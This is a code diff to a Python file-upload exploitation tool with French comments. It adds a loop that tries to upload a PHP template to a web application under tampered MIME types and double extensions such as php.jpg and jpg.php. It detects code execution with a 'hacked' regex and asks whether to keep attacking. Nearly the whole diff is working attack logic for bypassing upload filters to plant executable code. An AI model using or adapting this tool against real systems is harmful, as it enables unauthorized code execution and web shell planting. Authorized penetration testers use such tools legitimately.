@@ -166,36 +166,60 @@ else :
 if up.validExtensions == [] :
 	logger.error("No valid extension found.")
 	exit()
+
+
+#################### CHOIX DU TEMPLATE ICI, A CHANGER PLUS TARD #######################
+template = "template.php"##############################################################
+codeExecDetectionRegex = "hacked"###########################################################
+#######################################################################################
+templatefd = open(template,"rb")
+nastyExt = template.split(".")[-1]
+nastyMime = getMime(extensions,nastyExt)
+nastyExtVariants = {"php":["php1","php2","php3","php4","php5","phtml"]}
 #################################################################
 logger.info("### Starting shell upload detection (messing with file extensions and mime types...)")
-succeededAttempts = []
+#une technique = un suffix, un mime, un contenu, une regex de code exec detection
+attempts = []
+##
+##Naive attempt
+attempts.append({"suffix":"."+"$nastyExt$","mime":"$nastyMime$"})
+##mime type tampering
+attempts.append({"suffix":"."+"$nastyExt$","mime":"$legitMime$"})
+##double extension bad.good with nasty mime type
+attempts.append({"suffix":"."+"$nastyExt$.$legitExt$","mime":"$nastyMime$"})
+##double extension bad.good with gentle mime type
+attempts.append({"suffix":"."+"$nastyExt$.$legitExt$","mime":"$legitMime$"})
+##double extension good.bad with nasty mime type
+attempts.append({"suffix":"."+"$legitExt$.$nastyExt$","mime":"$nastyMime$"})
+##double extension good.bad with good mime type
+attempts.append({"suffix":"."+"$legitExt$.$nastyExt$","mime":"$legitMime$"})
 
-nastyExt = "php"
-nastyMime = getMime(extensions,nastyExt)
-template = open("template.php","rb")
-nastyExtVariants = ["php1","php2","php3","php4","php5","phtml"]
+#########################################################################################
+codeExecObtained = False
+nbOfValidExtensions = len(up.validExtensions)
+i = 0
+while not codeExecObtained and i < nbOfValidExtensions :
+	legitExt = up.validExtensions[i]
+	legitMime = getMime(extensions,legitExt)
+	#exec all known techniques
+	for a in attempts :
+		suffix = a["suffix"].replace("$nastyExt$",nastyExt)
+		suffix = suffix.replace("$legitExt$",legitExt)
+		suffix = suffix.replace("$nastyMime$",nastyMime)
+		suffix = suffix.replace("$legitMime$",legitMime)
+		mime = a["mime"].replace("$nastyExt$",nastyExt)
+		mime = mime.replace("$legitExt$",legitExt)
+		mime = mime.replace("$nastyMime$",nastyMime)
+		mime = mime.replace("$legitMime$",legitMime)
+		res = up.submitTestCase(suffix,mime,templatefd.read(),codeExecDetectionRegex)
+		templatefd.seek(0)
+		if res["codeExec"] :
+			logging.info("\033[1m\033[42mCode execution obtained ('%s','%s','%s'))\033[m",suffix,mime,template)
+			cont = input("Continue attacking ? [y/N] : ")
+			if cont not in ["y","Y","yes","YES","Yes"] :
+				exit()
 
-legitExt = up.validExtensions[0]
-legitMime = getMime(extensions,legitExt)
-up.submitTestCase("."+nastyExt,legitMime,template.read(),"hacked")
 
-exit()
-#trying to upload template as it is
-res = fileUploadTest(uploadURL,s,postData,"."+nastyExt,args.size,nastyMime,args.notRegex,args.trueRegex,fileInput["name"],template.read())
-if args.verbosity > 1 :
-	printSimpleResponseObject(res["responseObject"])
-if args.verbosity > 2 :
-	print(res["responseObject"].text)
-if res["success"] :
-	logger.info("\033[1m\033[42mFile '%s' uploaded with success using a mime type of '%s'.\033[m",res["filename"],nastyMime)
+	i += 1
 
-#trying to upload template by changing mime type only
-res = fileUploadTest(uploadURL,s,postData,"."+nastyExt,args.size,legitMime,args.notRegex,args.trueRegex,fileInput["name"],template.read())
-if args.verbosity > 1 :
-	printSimpleResponseObject(res["responseObject"])
-if args.verbosity > 2 :
-	print(res["responseObject"].text)
-if res["success"] :
-	logger.info("\033[1m\033[42mFile '%s' uploaded with success using a mime type of '%s'.\033[m",res["filename"],legitMime)
-
-template.close()
+templatefd.close()
